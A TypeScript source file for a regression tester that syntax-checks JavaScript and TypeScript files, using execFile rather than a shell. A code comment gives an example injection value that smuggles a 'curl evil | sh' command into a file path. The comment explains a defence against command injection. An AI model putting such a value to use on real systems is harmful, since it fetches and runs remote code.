import { execFile } from 'child_process';
import { promisify } from 'util';
import * as path from 'path';
import { Logger } from '../utils';

// execFile (argv array, no shell) instead of exec(string): a filePath containing shell
// metacharacters (e.g. `foo"; curl evil | sh; "`) can't break out and execute arbitrary commands.
const execFileAsync = promisify(execFile);

export class Tester {
  async runRegressionTest(filePath: string): Promise<{ passed: boolean; logs: string }> {
    Logger.info(`[Tester] Running dynamic regression test for ${filePath}...`);

    const ext = path.extname(filePath);

    try {
      if (ext === '.js') {
        await execFileAsync('node', ['--check', filePath]);
      } else if (ext === '.ts') {
        await execFileAsync('npx', ['tsc', '--noEmit', '--esModuleInterop', filePath]);
      }

      Logger.info(`[Tester] ✅ Dynamic Regression Passed.`);
      return { passed: true, logs: 'All execution paths parsed successfully.' };
    } catch (e: any) {
      Logger.warn(`[Tester] ❌ Regression Test Failed.`);
      return { passed: false, logs: e.stdout || e.stderr || e.message };
    }
  }
}
